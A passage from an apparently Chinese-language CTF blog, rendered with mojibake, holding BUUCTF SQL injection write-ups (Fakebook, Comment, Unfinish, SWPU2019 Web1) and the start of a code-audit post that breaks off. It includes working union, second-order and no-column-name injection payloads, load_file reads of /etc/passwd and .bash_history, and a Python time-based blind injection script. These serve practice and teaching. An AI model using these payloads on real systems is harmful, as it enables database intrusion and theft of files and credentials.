ï¼Œä½†åœ¨view.phpå¹¶ä¸å­˜åœ¨è¿‡æ»¤ï¼Œå¹¶ä¸”æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥unionä¸€ä¸ªå‡çš„ç”¨æˆ·,dataåœ¨ç¬¬å››ä¸ªå­—æ®µä¸Š</p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> UserInfo());</span><br></pre></td></tr></table></figure><p>è¯·æ±‚å¸¦ä¸Šï¼Œæ³¨æ„åºåˆ—åŒ–å­—ç¬¦ä¸²è¦åŠ ä¸Šå¼•å·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406122033.png" style="zoom:80%;"><p>æŸ¥çœ‹æºä»£ç ï¼Œç‚¹dataåè®®å°±è¡Œ</p><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406122146.png"></p><h2 id="ç½‘é¼æ¯-2018-Comment"><a href="#ç½‘é¼æ¯-2018-Comment" class="headerlink" title="[ç½‘é¼æ¯ 2018]Comment"></a>[ç½‘é¼æ¯ 2018]Comment</h2><h3 id="writeup-4"><a href="#writeup-4" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰«ç›®å½•ï¼Œå‘ç°gitæºç æ³„éœ²ï¼Œgit_extractæ¢å¤ï¼Œå¾—åˆ°<code>write_do.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>login.php</code>çˆ†ç ´å¼±å£ä»¤ï¼Œå¯†ç ä¸º<code>zhangwei666</code></p><p><strong>addslashes()å‡½æ•°</strong>ï¼š</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406152546.png" style="zoom:80%;"><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œå³å…ˆå‘æ•°æ®åº“æ’å…¥é—­åˆè¯­å¥ï¼Œç„¶åå†åœ¨æŸ¥è¯¢æ—¶å–å‡ºæ¥ï¼Œè¾¾åˆ°ç»•è¿‡addslashes()å‡½æ•°çš„ä½œç”¨</p><p>ä»ä¸Šé¢çš„ä»£ç å¯ä»¥çœ‹åˆ°writeé‚£å—æ˜¯æ’å…¥å¸–å­ä¿¡æ¯åˆ°æ•°æ®åº“ï¼Œè€Œcommenté‚£å—æ˜¯æŠŠè¯„è®ºå¹¶å­˜åˆ°æ•°æ®åº“é‡Œï¼Œå¹¶ä¸”è¿™å—æ ¹æ®idå€¼å–å‡ºäº†å¸–å­categoryå‚æ•°çš„å†…å®¹ï¼Œå¹¶æ’å…¥æ•°æ®åº“ï¼Œæ‰€ä»¥ï¼Œç°åœ¨æ€è·¯å¾ˆæ˜ç¡®ï¼Œå…ˆå‘ä¸€ä¸ªå¸–å­ï¼Œåœ¨categoryé‡Œå†™å…¥<code>&#39;</code>é—­åˆ</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406151519.png" style="zoom:80%;"><p>æ­¤æ—¶æ‰§è¡Œçš„sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> board</span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">&#x27;\&#x27;</span>,<span class="keyword">content</span>=<span class="keyword">database</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                title = &#x27;aaaaaaa&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;adsd&#x27;</span></span><br></pre></td></tr></table></figure><p>ç”±äºè½¬ä¹‰ï¼Œæ’å…¥åˆ°æ•°æ®åº“çš„å†…å®¹categoryå­—æ®µå€¼ä¸º<code>&#39;,content=database(),/*</code></p><p>æ¥ç€æˆ‘ä»¬å†</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406152003.png" style="zoom:80%;"><p>æ­¤æ—¶æ‰§è¡Œæ’å…¥æ“ä½œçš„sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">comment</span></span><br><span class="line">            <span class="keyword">set</span> <span class="keyword">category</span> = <span class="string">&#x27;&#x27;</span>,<span class="keyword">content</span>=<span class="keyword">database</span>(),<span class="comment">/*&#x27;,</span></span><br><span class="line"><span class="comment">                content = &#x27;*/</span><span class="comment">#&#x27;,</span></span><br><span class="line">                bo_id = <span class="string">&#x27;9&#x27;</span></span><br></pre></td></tr></table></figure><p>å°±æˆåŠŸæŠŠdatabase()ä½œä¸ºcontentå­—æ®µçš„å†…å®¹æ’å…¥</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406152746.png" style="zoom:80%;"><p>æŒ‰ç…§è¿™ç§æ€è·¯load_fileè¯»å–æ–‡ä»¶<code>/etc/passwd</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/etc/passwd&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406153117.png" style="zoom:80%;"><p>çœ‹åˆ°<code>/home/www</code>ä»¥bashè¿è¡Œï¼Œè¯»ä¸€ä¸‹<code>/home/www/.bash_history</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/home/www/.bash_history&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406153402.png" style="zoom:80%;"><p>çœ‹å‘½ä»¤å¯ä»¥çŒœæµ‹å†<code>/tmp/html/.DS_Store</code>æ–‡ä»¶ï¼Œç›´æ¥è¯»ä¼šè¯»ä¸å…¨ï¼Œç”¨hexç¼–ç </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span> <span class="keyword">hex</span>(<span class="keyword">load_file</span>(<span class="string">&quot;/tmp/html/.DS_Store&quot;</span>))),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406154005.png" style="zoom:80%;"><p>è®¿é—®ä¸€ä¸‹ï¼Œç¡®å®æœ‰ï¼Œè¯»ä¸€ä¸‹<code>flag_8946e1ff1ee3e40f.php</code>æ–‡ä»¶</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=(<span class="keyword">select</span> <span class="keyword">load_file</span>(<span class="string">&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;</span>)),<span class="comment">/*</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIMæˆªå›¾20200406154459.png" style="zoom:80%;"><h2 id="ç½‘é¼æ¯2018-Unfinish"><a href="#ç½‘é¼æ¯2018-Unfinish" class="headerlink" title="[ç½‘é¼æ¯2018]Unfinish"></a>[ç½‘é¼æ¯2018]Unfinish</h2><h3 id="writeup-5"><a href="#writeup-5" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰“å¼€è·³è½¬åˆ°<code>login.php</code>ï¼Œä¸çŸ¥é“ä¸ºå•¥æ‰«ç›®å½•æ‰«ä¸åˆ°<code>register.php</code>,å¯èƒ½æ˜¯buuç¯å¢ƒçš„é—®é¢˜å§</p><p>å…ˆåœ¨login.phpè¯•äº†å¾ˆä¹…æ²¡æœ‰å•¥æ”¶è·ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·å§ï¼Œç™»é™†å‘ç°é™¤äº†ç”¨æˆ·åå•¥éƒ½æ²¡æœ‰ï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°usernameå¤„æœ‰æ³¨å…¥</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQæˆªå›¾20200808174356.png" style="zoom:80%;"><p>fuzzä¸€ä¸‹å‘ç°è¿‡æ»¤äº†<code>,</code>å’Œ<code>information</code>ï¼Œç”±äºé€—å·è¿‡æ»¤</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(1,1,0)&lt;==&gt;  case when 1 then 1 else 0 end</span><br><span class="line">substr(database(),1,1)&lt;==&gt;substr(database() from 1 for 1)</span><br><span class="line">limt 9,4&lt;==&gt;limit 9 offset 4</span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808192506.png"></p><p>æµ‹è¯•ä¸Šé¢payloadå¯ç”¨ï¼Œå°±å¯ä»¥å†™è„šæœ¬äº†ï¼Œexp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://e2237b8f-0ea4-4294-bbe7-007af8f88f8b.node3.buuoj.cn/register.php&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    f1=flag</span><br><span class="line">    top=<span class="number">127</span></span><br><span class="line">    low=<span class="number">33</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=top:</span><br><span class="line">        mid=(top+low)//<span class="number">2</span></span><br><span class="line">        p1=<span class="string">&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))&gt;&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;</span>.format(i,mid)</span><br><span class="line">        p2=<span class="string">&quot;aaaaa&#x27; || (case when ascii(substr((select*from flag) from &#123;&#125; for 1))=&#123;&#125; then sleep(3) else 0 end) || &#x27;aaa&quot;</span>.format(i,mid)</span><br><span class="line">        data1=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;basb@qq.com&#x27;</span>,<span class="string">&#x27;username&#x27;</span>:p1,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        data2=&#123;<span class="string">&#x27;email&#x27;</span>:<span class="string">&#x27;basb@qq.com&#x27;</span>,<span class="string">&#x27;username&#x27;</span>:p2,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;1234&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            print(i,mid)</span><br><span class="line">            r1=requests.post(url,data=data2,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">            flag+=chr(mid)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r2=requests.post(url,data=data1,timeout=<span class="number">3</span>,proxies=proxies)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout <span class="keyword">as</span> e:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                top=mid<span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> flag==f1:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><h3 id="writeup-6"><a href="#writeup-6" class="headerlink" title="writeup"></a>writeup</h3><p>å¹¿å‘Šå¤„äºŒæ¬¡æ³¨å…¥,è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå…ˆåˆ¤æ–­åˆ—æ•°ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•å‘ç°æœ‰22åˆ—ï¼Œåˆ¤æ–­å›æ˜¾ä½å‘ç°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808162756.png"></p><p>å›æ˜¾ä½ä¸º2,3ä½</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test1&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">database</span>(),(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨å‘ç°ä¼šè¢«æ‹¦ï¼Œè¿‡æ»¤äº†information_schemaï¼Œbypasså‚è€ƒ:</p><p><a href="https://www.anquanke.com/post/id/193512">https://www.anquanke.com/post/id/193512</a></p><p>å¯ä»¥æ— åˆ—åæ³¨å…¥ç»•è¿‡ï¼Œå…ˆçŒœä¸€ä¸‹è¡¨åï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">count</span>(*)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808165041.png"></p><p>ä¸‰æ¡ï¼Œè¯´æ˜å­˜åœ¨è¯¥è¡¨</p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQæˆªå›¾20200808171132.png" style="zoom: 80%;"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test3&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(a)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)c),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20200808171715.png"></p><p>æ³¨flagå†…å®¹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test4&#x27;<span class="comment">/**/</span>UNION<span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(b)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span>*<span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">users</span>)c),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuctf </tag>
            
            <tag> sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctfåˆ·é¢˜-ä»£ç å®¡è®¡ç¯‡</title>
      <link href="2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/"/>
      <url>2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†buuctf webéƒ¨åˆ†ä»£ç å®¡è®¡é¢˜ç›®çš„wpï¼æŒç»­æ›´æ–°ï¼</p><a id="more"></a><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>æ‰“å¼€é¢˜ç›®ï¼ŒæŸ¥çœ‹æºä»£ç å‘ç°<code>source.php</code>,å¾—åˆ°æºä»£ç ï¼Œä»£ç å®¡è®¡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span 